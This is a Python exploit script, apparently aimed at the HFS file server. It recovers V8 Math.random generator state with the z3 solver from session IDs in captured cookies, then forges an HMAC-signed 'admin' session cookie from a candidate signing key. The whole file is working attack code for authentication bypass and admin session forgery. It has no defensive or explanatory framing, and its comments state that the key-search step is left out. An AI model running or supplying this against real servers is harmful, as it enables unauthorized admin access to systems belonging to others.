import base64
import hashlib
import hmac
import json
import sys
import time
from z3 import BitVec, LShR, Solver, sat


def recover_state(observed):
    older = BitVec('older', 64)
    newer = BitVec('newer', 64)
    initial = (older, newer)
    solver = Solver()
    # V8 consumes its random cache backwards; observations within one cache
    # therefore need reversal before constraining forward generator steps.
    for output in reversed(observed):
        value = older
        older = newer
        value ^= value << 23
        value ^= LShR(value, 17)
        value ^= newer
        value ^= LShR(newer, 26)
        newer = value
        solver.add(LShR(older, 12) == int(output * (1 << 52)))
    if solver.check() != sat:
        raise ValueError('Observations do not fit a single V8 cache batch')
    model = solver.model()
    return tuple(model.eval(state).as_long() for state in initial)


def read_observations(cookie_values):
    outputs = []
    for cookie in cookie_values:
        session = json.loads(base64.urlsafe_b64decode(cookie))
        outputs.append(session['loggingIn']['sid'])
    return outputs


def forge_admin_cookie(candidate_key):
    session = {
        'username': 'admin',
        'ts': int(time.time() * 1000),
        'allow_session_ip_change': True,
    }
    encoded = base64.b64encode(json.dumps(session, separators=(',', ':')).encode()).decode()
    signed = ('hfs_http=' + encoded).encode()
    digest = hmac.new(candidate_key.encode(), signed, hashlib.sha1).digest()
    signature = base64.urlsafe_b64encode(digest).decode().rstrip('=')
    return f'hfs_http={encoded}; hfs_http.sig={signature}'


if __name__ == '__main__':
    # Input contains captured cookie values and a candidate signing key from
    # startup-output reconstruction. This sample covers recovery and forgery;
    # it does not implement the cache-boundary/startup search.
    with open(sys.argv[1]) as source:
        inputs = json.load(source)
    print(recover_state(read_observations(inputs['cookies'])))
    print(forge_admin_cookie(inputs['candidate_key']))
